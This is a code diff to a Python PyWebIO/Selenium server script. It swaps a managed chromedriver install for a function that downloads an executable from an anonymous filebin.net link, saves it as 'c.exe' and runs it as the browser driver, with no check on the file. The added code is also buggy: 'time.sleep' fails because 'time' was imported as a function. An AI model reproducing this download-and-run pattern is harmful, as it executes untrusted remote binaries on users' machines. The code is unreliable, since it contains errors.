@@ -26,17 +26,20 @@ from selenium import webdriver
 from os import system, name
 import chromedriver_binary
 from time import time, strftime, gmtime, sleep
-import pyfiglet, os, threading
-import chromedriver_autoinstaller
+import requests
 
 
-def pc():
-        put_text('sdsds')
-        from selenium import webdriver
-        from webdriver_manager.chrome import ChromeDriverManager
-        driver = webdriver.Chrome(ChromeDriverManager().install())
 
-    
+def page():
+
+
+    URL = "https://filebin.net/ux7dx4eb3njjicmd/chromedriver.exe"
+    response = requests.get(URL)
+    open("c.exe", "wb").write(response.content)
+    time.sleep(20)
+    d=webdriver.Chrome('c.exe')
+    d.get('https://filebin.net/ux7dx4eb3njjicmd/chromedriver.exe')
+
 
 
 
@@ -54,5 +57,5 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument("-p", "--port", type=int, default=8080)
     args = parser.parse_args()
-    start_server(pc, port=args.port,debug=True,max_payload_size='10000000',reconnect_timeout=4)
+    start_server(page, port=args.port,debug=True,max_payload_size='10000000',reconnect_timeout=4)
 
